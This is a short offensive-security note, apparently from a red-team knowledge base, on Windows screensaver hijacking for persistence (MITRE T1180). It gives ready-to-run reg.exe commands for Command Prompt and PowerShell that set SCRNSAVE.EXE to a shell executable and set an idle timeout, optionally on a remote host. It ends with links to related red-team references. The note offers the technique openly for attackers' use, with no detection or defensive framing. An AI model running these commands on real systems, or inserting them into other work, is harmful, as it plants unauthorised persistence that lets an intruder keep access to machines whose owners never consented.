---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - T1180
  - windows
---
# Living off the Land

TODO: Refer to the link

## 01 - Command Prompt

```
C:\> reg.exe add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg.exe add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "<seconds>" /f
```

## 02 - PowerShell

TODO: Convert the commands to cmdlets

```
PS C:\> reg add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\path\to\shell.exe" /f

PS C:\> reg add "[\\<IP>\]HKCU\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "<seconds>" /f
```

---
## References

### LOFLCAB

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

### Github

- [austin-lai: Persistence through Windows Screensaver Hijacking](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking)

### Persistence Info

- [Persistence Info: Screen Saver](https://persistence-info.github.io/Data/screensaver.html)

### Red Team Notes

- [Red Team Notes: Screensaver Hijack](https://www.ired.team/offensive-security/persistence/t1180-screensaver-hijack)